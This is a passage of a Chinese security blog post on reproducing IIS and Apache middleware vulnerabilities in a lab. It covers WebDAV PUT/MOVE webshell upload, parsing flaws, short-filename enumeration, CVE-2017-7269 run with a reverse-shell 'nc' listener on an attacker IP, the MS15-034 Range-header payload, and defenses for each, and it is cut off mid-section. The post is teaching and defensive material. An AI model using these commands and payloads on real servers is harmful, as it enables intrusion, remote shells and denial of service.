<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="𝐴_𝑌𝑢">





<title>中间件漏洞 | 𝓐_𝚼𝓾ʹ𝒔 𝓑ℓ𝖔𝓰</title>



    <link rel="icon" href="/image/favicon.svg">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


    <link rel="stylesheet" href="//at.alicdn.com/t/font_1614813_fp9wxdcpr9c.css"
<meta name="generator" content="Hexo 6.1.0"></head>
<body>
    <div class="wrapper">
        <link rel="stylesheet" href="../fonts/iconfont2/iconfont.css"> 

<header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/"><i class="iconfont icon-zhuye"></i>主页</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">
                        
                            <i class="iconfont icon-archives "></i>
                        
                        
                        
                        
                        文章
                    </a>
                
                    <a class="menu-item" href="/category">
                        
                        
                            <i class="iconfont icon-categorys "></i>
                        
                        
                        
                        分类
                    </a>
                
                    <a class="menu-item" href="/tag">
                        
                        
                        
                            <i class="iconfont icon-tags "></i>
                        
                        
                        标签
                    </a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>

        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">主页</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; 菜单</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">
                        
                            <i class="iconfont icon-archives "></i>
                        
                        
                        
                        
                        文章
                    </a>
                
                    <a class="menu-item" href="/category">
                        
                        
                            <i class="iconfont icon-categorys "></i>
                        
                        
                        
                        分类
                    </a>
                
                    <a class="menu-item" href="/tag">
                        
                        
                        
                            <i class="iconfont icon-tags "></i>
                        
                        
                        标签
                    </a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">▶︎ 展开目录</a>
    </div>
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a onclick="go_top()">△ 顶部</a>
        <a onclick="go_bottom()">▽ 底部</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "▼ 收起目录"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "▶︎ 展开目录"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">中间件漏洞</h1>
            
                <div class="post-meta">
                    
                        <!--作者:-->
                        <i class="iconfont icon-user"></i>
                        <a itemprop="author" rel="author" href="/">𝐴_𝑌𝑢 </a> &nbsp;
                    

                    
                        <span class="post-time">
                        <!--发布时间:-->
                        <i class="iconfont icon-time"></i>
                        <a href="#">2022-05-10&nbsp;&nbsp;8:05:57</a> &nbsp;
                        </span>
                    
                    
                        <span class="post-category">
                        <!--分类:-->
                        <i class="iconfont icon-category"></i>
                            
                                <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>&nbsp;
                            
                        </span>
                    
                    
                    <span id="/2022/05/10/22-0510-01/" class="leancloud-visitors view" data-flag-title="中间件漏洞">
                        <text class="post-meta-item-text">
                            <!--阅读数:-->
                            <i class="iconfont icon-view"></i>
                        </text>
                        
                        <text class="leancloud-visitors-count">加载中</text>
                      </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><h2 id="IIS-6-x"><a href="#IIS-6-x" class="headerlink" title="IIS 6.x"></a>IIS 6.x</h2><h3 id="put漏洞"><a href="#put漏洞" class="headerlink" title="put漏洞"></a>put漏洞</h3><p>目标网站upload.moonteam.com搭建在IIS上，并且IIS Server 在 Web 服务扩展中开启了 WebDAV</p>
<img src="/2022/05/10/22-0510-01/image-20220513161754619.png" alt="image-20220513161754619" style="zoom:80%;">

<p> 同时目标网站upload.moonteam.com配置了可以写入的权限</p>
<img src="/2022/05/10/22-0510-01/image-20220513162427686.png" alt="image-20220513162427686" style="zoom:80%;">

<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>对目标网站进行burp抓包，然后将GET改成OPTIONS，查看支持的协议</p>
<img src="/2022/05/10/22-0510-01/image-20220513163501850.png" alt="image-20220513163501850" style="zoom:80%;">

<p>改成OPTIONS后，发现支持PUT上传方式，当然也支持MOVE（重命名）</p>
<img src="/2022/05/10/22-0510-01/image-20220513163707880.png" alt="image-20220513163707880" style="zoom:80%;">

<p>然后通过put上传一个文本文档到目标网站中</p>
<img src="/2022/05/10/22-0510-01/image-20220513164032816.png" alt="image-20220513164032816" style="zoom:80%;">

<p>成功上传到目标网站中</p>
<img src="/2022/05/10/22-0510-01/image-20220513164233469.png" alt="image-20220513164233469" style="zoom:80%;">

<p>然后通过MOVE重命名把ayu.txt改成ayu.asp</p>
<img src="/2022/05/10/22-0510-01/image-20220513164824878.png" alt="image-20220513164824878" style="zoom:80%;">



<p>修改成功</p>
<img src="/2022/05/10/22-0510-01/image-20220513165825800.png" alt="image-20220513165825800" style="zoom:80%;">

<p>后续的操作就无需多言了，但这里为啥我们不直接通过PUT上传ayu.asp呢？因为一般直接上传都是失败的，所以先上传txt文件，然后再通过MOVE修改成asp文件</p>
<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><ol>
<li>关闭webdav</li>
<li>关闭写入权限</li>
</ol>
<h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="基于文件名"><a href="#基于文件名" class="headerlink" title="基于文件名"></a>基于文件名</h4><p>该版本的IIS会默认将<code>*.asp;.jpg</code> 此种格式的文件名，当成Asp解析。服务器默认不解析 <code>;</code> 号及其后面的内容，相当于截断</p>
<p>由于在目标网站的属性—主目录—配置—映射—应用程序扩展—编辑，查看到<code>.asa</code>被映射到了可执行文件<code>C:\WINDOWS\system32\inetsrv\asp.dll</code>，也就是说<code>.asa</code>可以被解析成<code>.asp</code></p>
<img src="/2022/05/10/22-0510-01/image-20220513170825522.png" alt="image-20220513170825522" style="zoom:80%;">

<p>基于上述配置，除了.asa会被解析成.asp外，cer、cdx都会被解析成asp，也就是说<code>cer</code>、<code>cdx</code>、<code>asa</code>扩展名都会被解析成<code>asp</code></p>
<h5 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h5><p>我们的目标网站中已经提前上传了一个图片<code>sb.asp;1.jpg</code></p>
<img src="/2022/05/10/22-0510-01/image-20220513172555287.png" alt="image-20220513172555287" style="zoom:80%;">

<p>由于漏洞，所以<code>sb.asp;1.jpg</code>会被解析成<code>sb.asp</code>，而sb.asp是一个木马，我们访问该图片实际就是访问sb.asp木马，如下：</p>
<img src="/2022/05/10/22-0510-01/image-20220513172912087.png" alt="image-20220513172912087" style="zoom:80%;">

<h5 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h5><ol>
<li>禁止创建和上传此类畸形文件</li>
<li>图片存放目录设置成禁止脚本文件执行</li>
<li>升级iis版本</li>
</ol>
<h4 id="基于文件夹"><a href="#基于文件夹" class="headerlink" title="基于文件夹"></a>基于文件夹</h4><p>该版本默认将 <code>*.asp/</code> 目录下的所有文件当成Asp解析</p>
<h5 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h5><p>目标网站下的c.asp文件夹下有一个asp的图片马1.jpg</p>
<img src="/2022/05/10/22-0510-01/image-20220513173410570.png" alt="image-20220513173410570" style="zoom:80%;">

<p>访问c.sap文件夹下的1.jpg，实际上会将1.jpg解析成1.asp木马，如下：</p>
<img src="/2022/05/10/22-0510-01/image-20220513173530870.png" alt="image-20220513173530870" style="zoom:80%;">

<h5 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h5><ol>
<li>禁止创建此类文件夹</li>
<li>升级iis版本</li>
</ol>
<h3 id="短文件漏洞"><a href="#短文件漏洞" class="headerlink" title="短文件漏洞"></a>短文件漏洞</h3><p>Windows 支持以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位Windows的程序访问这些文件、</p>
<p><strong>短文件名产生的条件</strong></p>
<ul>
<li>注册表<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem</code>中 <code>NtfsDisable8dot3NameCreation</code>的值为0</li>
<li>当文件后缀名字符长度小于4时，短文件名的产生需要文件名前缀字符长度大于9位</li>
<li>当文件后缀名字符长度大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名</li>
</ul>
<p><strong>短文件名的特征</strong></p>
<ul>
<li><p>只显示前6位的字符,后续字符用~1代替，其中数字1是可以递增。如果存在文件名类似的文件，则前面的6个字符是相同的,后面的数字进行递增</p>
<img src="/2022/05/10/22-0510-01/image-20220513220308797.png" alt="image-20220513220308797" style="zoom:80%;">
</li>
<li><p>后缀名最长只有3位,超过3位的会生成短文件名,且后缀多余的部分会截断</p>
<img src="/2022/05/10/22-0510-01/image-20220513220530626.png" alt="image-20220513220530626" style="zoom:80%;">
</li>
<li><p>所有小写字母均转换成大写的字母</p>
<img src="/2022/05/10/22-0510-01/image-20220513220638045.png" alt="image-20220513220638045" style="zoom:80%;">
</li>
<li><p>长文件名中包含多个”.”的时候,以文件最后一个”.”作为短文件名的后缀</p>
<img src="/2022/05/10/22-0510-01/image-20220513220822135.png" alt="image-20220513220822135" style="zoom:80%;">
</li>
<li><p>长文件名前缀&#x2F;文件夹名字符长度符合0-9和A-Z、a-z范围且需要大于等于9位才会生成短文件名，如果包含空格或者其他部分特殊字符,不论长度均会生成短文件</p>
<img src="/2022/05/10/22-0510-01/image-20220513221236003.png" alt="image-20220513221236003" style="zoom:80%;"></li>
</ul>
<p>如下，可以通过 <code>dir /x</code> 查看短文件名（同时参考上面短文件名产生的条件）</p>
<img src="/2022/05/10/22-0510-01/image-20220513215739094.png" alt="image-20220513215739094" style="zoom:80%;">

<h4 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h4><p>IIS 8.0 以下版本需要开启 ASP.NET 支持（如果IIS &gt;&#x3D;8.0 版本,即使没有安装 ASP.NET ，通过 OPTIONS 和 TRACE 方法也可以猜解成功）</p>
<p>由于这里是IIS 6.x ，所以首先开启ASP.NET支持，开启方法如下：</p>
<img src="/2022/05/10/22-0510-01/image-20220513175118578.png" alt="image-20220513175118578" style="zoom:80%;">

<p>查看当前网站目录下的短文件名</p>
<img src="/2022/05/10/22-0510-01/image-20220513225756156.png" alt="image-20220513225756156" style="zoom:80%;">

<p><strong>验证存在短文件名漏洞</strong></p>
<p>只要有短文件名，那么基本都会有<code>~1</code>，通过正则表达式通配符<code>*</code>可以匹配到其它的字符，比如：<code>1234~1.JPE</code>，第一个<code>*</code>匹配<code>1234</code>，第二个<code>*</code>匹配<code>.JPE</code>，这样<code>*~1*</code>，就能匹配到<code>1234~1.JPE</code>。</p>
<p>所以只要短文件名，基本都有<code>~1</code>，而通过<code>*~1*</code>则能够匹配到短文件名</p>
<p>访问<code>http://upload.moonteam.com/*~1*/a.aspx</code>出现404，说明目标网站中存在短文件名（a.aspx没看懂有啥用，但貌似必须要有）</p>
<img src="/2022/05/10/22-0510-01/image-20220513223500472.png" alt="image-20220513223500472" style="zoom:80%;">

<p>通过浏览器访问短文件名<code>bbbbb*~1*</code>，返回400，说明<code>bbbbb*~1*</code>无法匹配到短文件名，也就是没有相关的短文件名</p>
<p>访问<code>http://upload.moonteam.com/bbbbb*~1*/a.aspx</code></p>
<img src="/2022/05/10/22-0510-01/image-20220513224950889.png" alt="image-20220513224950889" style="zoom:80%;">

<p>通过访问上面两个payload，根据返回的404和400状态码，可判断出目标网站存在短文件漏洞</p>
<p><strong>猜解短文件名</strong></p>
<p>访问<code>http://upload.moonteam.com/1*~1*/a.aspx</code>，出现404，说明<code>1*~1*</code>可以匹配到目标网站的短文件名</p>
<img src="/2022/05/10/22-0510-01/image-20220513225316106.png" alt="image-20220513225316106" style="zoom:80%;">

<p>访问<code>http://upload.moonteam.com/12*~1*/a.aspx</code>，出现404，说明<code>12*~1*</code>也可以匹配到目标网站的短文件名</p>
<img src="/2022/05/10/22-0510-01/image-20220513225439612.png" alt="image-20220513225439612" style="zoom:80%;">

<p>访问<code>http://upload.moonteam.com/123*~1*/a.aspx</code>，出现404，说明<code>123*~1*</code>也可以匹配到目标网站的短文件名</p>
<img src="/2022/05/10/22-0510-01/image-20220513225506172.png" alt="image-20220513225506172" style="zoom:80%;">

<p>访问<code>http://upload.moonteam.com/1234*~1*/a.aspx</code>，出现404，说明<code>1234*~1*</code>也可以匹配到目标网站的短文件名</p>
<img src="/2022/05/10/22-0510-01/image-20220513225537245.png" alt="image-20220513225537245" style="zoom:80%;">

<p>访问<code>http://upload.moonteam.com/12345*~1*/a.aspx</code>，出现400，说明<code>12345*~1*</code>匹配不到到目标网站的短文件名，也就是说目标的短文件名的前缀为1234</p>
<img src="/2022/05/10/22-0510-01/image-20220513225834496.png" alt="image-20220513225834496" style="zoom:80%;">

<p>访问<code>http://upload.moonteam.com/1234*~1.jpe*/a.aspx</code>出现404，说明短文件名就是<code>1234.jpe</code>，但是一般没有jpe这样格式的文件，而结合短文件名的特点，猜解出1234.jpe这个短文件名对应的文件可能是1234.jpeg</p>
<img src="/2022/05/10/22-0510-01/image-20220513230150625.png" alt="image-20220513230150625" style="zoom:80%;">

<p><strong>利用脚本猜接短文件名</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/shelldownow/python3-iis_shortname_Scan-">https://github.com/shelldownow/python3-iis_shortname_Scan-</a></p>
<p><strong>短文件名漏洞的局限性</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解</span><br><span class="line">如果文件名本身太短（无短文件名）也是无法猜解的</span><br><span class="line">如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配</span><br><span class="line">如果文件夹名前6位字符带点“.”，扫描程序会认为是文件而不是文件夹，最终出现误报</span><br><span class="line">不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过4个中文字会产生短文件名，但是IIS不支持中文猜测</span><br></pre></td></tr></table></figure>

<h4 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h4><ol>
<li><p>升级.net framework</p>
</li>
<li><p>修改注册表键值<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem</code>修改<code>NtfsDisable8dot3NameCreation</code>为1，修改完成后,需要重启系统生效。也可通过命令行 <code>fsutil behavior set disable8dot3 1</code>关闭短文件名）</p>
<p>注意：注:此方法只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除,需要重新复制才会消失。如果不重新复制，已经存在的短文件名则是不会消失的。</p>
</li>
</ol>
<h3 id="IIS-RCE-CVE-2017-7269"><a href="#IIS-RCE-CVE-2017-7269" class="headerlink" title="IIS RCE-CVE-2017-7269"></a>IIS RCE-CVE-2017-7269</h3><p>Microsoft windows Server 2003 R2中的 Interne信息服务IIS6.0中的 WebDAV服务中的ScStoragePathFromUrl函数中的缓冲区溢出允许远程攻击者通过以 If:&lt;http:&#x2F;&#x2F; 开头的长标头执行任意代码 PROPFIND请求</p>
<h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>WiNdows Server 2003 R2上使用IIS6.0并开启 WebDAV扩展。</p>
<h4 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h4><p>exp地址：<a target="_blank" rel="noopener" href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269">https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python iis 192.168.0.115 80 192.168.0.154 9999 </span><br><span class="line">nc -lvnp 9999</span><br><span class="line">//192.168.0.115是目标网站ip，80是目标网站对应的端口，192.168.0.154是攻击主机的ip</span><br><span class="line">//nc -lvnp 9999在攻击主机上做监听</span><br></pre></td></tr></table></figure>

<h4 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h4><ol>
<li>关闭 WebDav服务</li>
<li>升级</li>
<li>部署安全设备</li>
</ol>
<h2 id="IIS-7-x"><a href="#IIS-7-x" class="headerlink" title="IIS 7.x"></a>IIS 7.x</h2><h3 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h3><p><strong>原理</strong></p>
<p>IIS7.x版本在Fast-CGl运行模式下，在任意文件，例：a001.jpg&#x2F;png后面加上&#x2F;.php，会将a001.jpg&#x2F;png解析为php文件</p>
<h4 id="复现-5"><a href="#复现-5" class="headerlink" title="复现"></a>复现</h4><p>目标网站<code>http://192.168.43.29:8980/</code>上面存在1.txt文件，如下：</p>
<img src="/2022/05/10/22-0510-01/image-20220514151801695.png" alt="image-20220514151801695" style="zoom:80%;">

<p>加上<code>/.php</code>后，访问<code>http://192.168.43.29:8980/1.txt/.php</code>，即可把txt解析成php文件</p>
<img src="/2022/05/10/22-0510-01/image-20220514152053378.png" alt="image-20220514152053378" style="zoom:80%;">

<h4 id="防御-5"><a href="#防御-5" class="headerlink" title="防御"></a>防御</h4><ol>
<li><p>配置cgi.fix_pathinfo(php.ini中)为0，并重启php-cgi程序</p>
<p>配置后再次访问</p>
<img src="/2022/05/10/22-0510-01/image-20220514153746990.png" alt="image-20220514153746990" style="zoom:80%;">
</li>
<li><p>配置IIS管理器，如下</p>
<img src="/2022/05/10/22-0510-01/image-20220514154003642.png" alt="image-20220514154003642" style="zoom:80%;">

<p>

<img src="/2022/05/10/22-0510-01/image-20220514154150828.png" alt="image-20220514154150828" style="zoom:80%;">

</p><p>配置后再次访问</p>
<img src="/2022/05/10/22-0510-01/image-20220514154242394.png" alt="image-20220514154150828" style="zoom:80%;"></li>
</ol>
<h3 id="HTTP-SYS远程代码执行-MS15-034"><a href="#HTTP-SYS远程代码执行-MS15-034" class="headerlink" title="HTTP.SYS远程代码执行(MS15-034)"></a>HTTP.SYS远程代码执行(MS15-034)</h3><p><strong>介绍</strong></p>
<p>HTTP.SYS是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.SYS</p>
<p>HTTP.SYS远程代码执行漏洞实质是HTTP.SYS的整数溢出漏洞，当攻击者向受影响的Windows系统发送特殊设计的HTTP 请求，HTTP.sys 未正确分析时就会导致此漏洞，成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码</p>
<p>主要存在Windows+IIS的环境下，任何安装了微软IIS 6.0以上的Windows Server 2008 R2&#x2F;Server 2012&#x2F;Server 2012 R2以及Windows 7&#x2F;8&#x2F;8.1操作系统都受到这个漏洞的影响验证这个漏洞</p>
<p><strong>影响范围</strong></p>
<p>Windows7、Windows server 2008 R2、Windows8、Windows server2012、Windows8.1和 Windows server 2012 R2</p>
<h4 id="复现-6"><a href="#复现-6" class="headerlink" title="复现"></a>复现</h4><p>访问目标网站<code>http://192.168.43.29/</code>并burp抓包</p>
<img src="/2022/05/10/22-0510-01/image-20220514160810529.png" alt="image-20220514160810529" style="zoom:80%;">

<p>插入payload<code>Range: bytes=0-18446744073709551615</code> ，然后发送，得到304状态码，如果是416状态码，则证明存在该漏洞</p>
<img src="/2022/05/10/22-0510-01/image-20220514160935846.png" alt="image-20220514160935846" style="zoom:80%;">

<p>删除部分请求头的内容</p>
<img src="/2022/05/10/22-0510-01/image-20220514161116936.png" alt="image-20220514161116936" style="zoom:80%;">

<p>得到416，证明目标网站存在该漏洞</p>
<img src="/2022/05/10/22-0510-01/image-20220514161150142.png" alt="image-20220514161150142" style="zoom:80%;">

<p>利用相关exp可以攻击该网站，可以让网站变得卡顿，或者电脑直接蓝屏等</p>
<p>exp：<a target="_blank" rel="noopener" href="https://github.com/davidjura/MS15-034-IIS-Active-DoS-Exploit-PoC">https://github.com/davidjura/MS15-034-IIS-Active-DoS-Exploit-PoC</a></p>
<p>利用exp脚本</p>
<img src="/2022/05/10/22-0510-01/image-20220514161920326.png" alt="image-20220514161920326" style="zoom:80%;">

<p>攻击后，目标网站电脑如下</p>
<img src="/2022/05/10/22-0510-01/image-20220514161816419.png" alt="image-20220514161816419" style="zoom:80%;">

<h4 id="防御-6"><a href="#防御-6" class="headerlink" title="防御"></a>防御</h4><ol>
<li>安装修复补丁（KB3042553）</li>
</ol>
<h1 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h1><p>Apache 是世界使用排名第一的 Web 服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的 Web 服务器端软件之一。</p>
<p>Apache 是跨平台纯粹的 web 服务器，负责接收处理&#x2F;响应 http 请求，之所以说它是纯粹的 web 服务器，是因为 apache 对于 html 页面的解析能力很强，但是不能解析嵌入页面内的服务器端脚本代码（如：jsp&#x2F;servlet），那么 apache 无法直接解析 .php 文件的，如果要解析 .php文件 ，还需要 php 处理器，即，apache 负责接收和响应 http 请求，若请求中涉及到 .php 文件，那么 apache 会将该文件发送给 php 处理器处理，php 处理器解析完成后，生成 html 文件，并将该 html 文件发送给 apache，再由 apache 返回最终的结果给浏览器。</p>
<p>Apache与php有三种结合方式：</p>
<ol>
<li>CGI</li>
<li>FastCGI</li>
<li>Module</li>
</ol>
<p>Apache默认是以Module模式运行php，如果想要以FastCGI方式运行php（自行百度）</p>
<h2 id="未知扩展名解析漏洞"><a href="#未知扩展名解析漏洞" class="headerlink" title="未知扩展名解析漏洞"></a>未知扩展名解析漏洞</h2><p><strong>漏洞原理</strong></p>
<p>Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别，则继续向左识别，直到识别到合法后缀才进行解析，如果都不认识将会暴露源码。比如：上传了一个名字叫lcx.php.qqq 的文件，当此特性存在的时候，一看.qqq不认识，继续解析，.php我认识，解析成php文件了</p>
<p>那么哪些后缀Apache不认识？不在mime.types当中的都不认识（mime.types在Apache的安装目录下）</p>
<img src="/2022/05/10/22-0510-01/image-20220514165214836.png" alt="image-20220514165214836" style="zoom:80%;">



<p><strong>漏洞存在条件</strong></p>
<ol>
<li>使用 module 模式与 php 结合的所有版本 apache 存在未知扩展名解析漏洞</li>
<li>使用 fastcgi 模式与 php 结合的所有版本 apache 不存在此漏洞</li>
<li>利用此漏洞时必须保证扩展名中至少带有一个.php，不然将默认作为txt&#x2F;html文档处理</li>
</ol>
<h3 id="复现-7"><a href="#复现-7" class="headerlink" title="复现"></a>复现</h3><p>这里的目标网站搭建在kali上，因为kali是自带apache	的，查看kali中自带apache的版本</p>
<img src="/2022/05/10/22-0510-01/image-20220514193339694.png" alt="image-20220514193339694" style="zoom:80%;">

<p>首先运行apache</p>
<img src="/2022/05/10/22-0510-01/image-20220514193714687.png" alt="image-20220514193714687" style="zoom:80%;">

<p>查看apache与php的结合方式<code>/usr/sbin/apachectl -M | grep php</code>，这里默认是module</p>
<img src="/2022/05/10/22-0510-01/image-20220514203126234.png" alt="image-20220514203126234" style="zoom:80%;">

<p>前面提到了 apache 需要将文件交给 php 处理器，那么，apache 是如何能够确定将 .php 文件交给 php处理器的呢？为啥不能够将 .txt 文件交给 php 处理器呢？</p>
<p>进入mods-enabled路径下</p>
<img src="/2022/05/10/22-0510-01/image-20220514204444805.png" alt="image-20220514204444805" style="zoom:80%;">

<p>查看php7.4.conf</p>
<img src="/2022/05/10/22-0510-01/image-20220514204518708.png" alt="image-20220514204518708" style="zoom:80%;">

<p>

<img src="/2022/05/10/22-0510-01/image-20220514204803577.png" alt="image-20220514204803577" style="zoom:80%;">

</p><p>在正则表达式中 $ 是从字符串的末尾开始匹配，如果设置了RegExp对象的Multiline属性的条件下，还会匹配到字符串结尾的换行符”\n”或”\r”。根据上面的正则表达式<code>.+\.ph(ar|p|tml)$</code>，会匹配 .php|.phar|.phtml，也就是说，apache 会将这些后缀名的文件交给 php 处理器，但是如果我们把最后的 <code>$</code> 改成 <code>\.</code>，	那么就会匹配 .php|.phar|.phtml 后面的 .* 文件，比如：1.php.bak，就会被匹配到，但是 apache  不认识 1.php.abk 最后的后缀名 .abk ，所以会从最后继续向左识别，最终识别出 1.php，然后再把 1.php 交给 php 处理器来处理，解析成 php 文件</p>
<p>进行修改后，退出保存</p>
<img src="/2022/05/10/22-0510-01/image-20220514210931163.png" alt="image-20220514210931163" style="zoom:80%;">

<p>然后在 &#x2F;var&#x2F;www&#x2F;html 中创建 1.php.bak ，并在里面写入  <code>&lt;?php phpinfo();?&gt;</code></p>
<img src="/2022/05/10/22-0510-01/image-20220514211159551.png" alt="image-20220514211159551" style="zoom:80%;">

<p>然后重启apache<code>sudo service apache2 restart</code>，kali上访问 1.php.bak</p>
<img src="/2022/05/10/22-0510-01/image-20220514211350847.png" alt="image-20220514211350847" style="zoom:80%;">

<h3 id="防御-7"><a href="#防御-7" class="headerlink" title="防御"></a>防御</h3><ol>
<li><p>在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为 .php. 的访问权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;.(php.|php3.|php4.|php5.)&quot;&gt;</span><br><span class="line">Order Deny,Allow </span><br><span class="line">Deny from all </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果需要保留文件名，可以修改程序源代码，替换上传文件名中的“.”为“_”：</p>
<p>$filename &#x3D; str_replace(‘.’, ‘_’, $filename);</p>
</li>
</ol>
<h2 id="AddHandler导致的解析漏洞"><a href="#AddHandler导致的解析漏洞" class="headerlink" title="AddHandler导致的解析漏洞"></a>AddHandler导致的解析漏洞</h2><p>由于配置不到导致的漏洞</p>
<h3 id="复现-8"><a href="#复现-8" class="headerlink" title="复现"></a>复现</h3><p>这里采用phpstudy2016搭建，apache版本是2.4.23，php版本是5.3.29</p>
<img src="/2022/05/10/22-0510-01/image-20220514214021174.png" alt="image-20220514214021174" style="zoom:80%;">

<p>在httpd.conf中配置不当</p>
<img src="/2022/05/10/22-0510-01/image-20220514214315835.png" alt="image-20220514214315835" style="zoom:80%;">

<p>如果不小心删除了前面的#</p>
<img src="/2022/05/10/22-0510-01/image-20220514214407795.png" alt="image-20220514214407795" style="zoom:80%;">

<p>那么就会导致漏洞，在有多个后缀的情况下，只要包含.php后缀的文件就会被识别出php文件进行解析，不需要是最后一个后缀</p>
<p>访问 1.php.bak 文件，竟然没有成功解析</p>
<img src="/2022/05/10/22-0510-01/image-20220514214845410.png" alt="image-20220514214845410" style="zoom:80%;">

<p>我们更换下apache和php的版本，apache版本还是2.4.23，但是php版本切换成了5.2.17</p>
<img src="/2022/05/10/22-0510-01/image-20220514215003151.png" alt="image-20220514215003151" style="zoom:80%;">

<p>再次尝试即可成功</p>
<img src="/2022/05/10/22-0510-01/image-20220514215111551.png" alt="image-20220514215111551" style="zoom:80%;">

<p>注意：该漏洞php版本还要低一些才可以</p>
<h3 id="防御-8"><a href="#防御-8" class="headerlink" title="防御"></a>防御</h3><ol>
<li><p>在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为 .php. 的访问权限：</p>
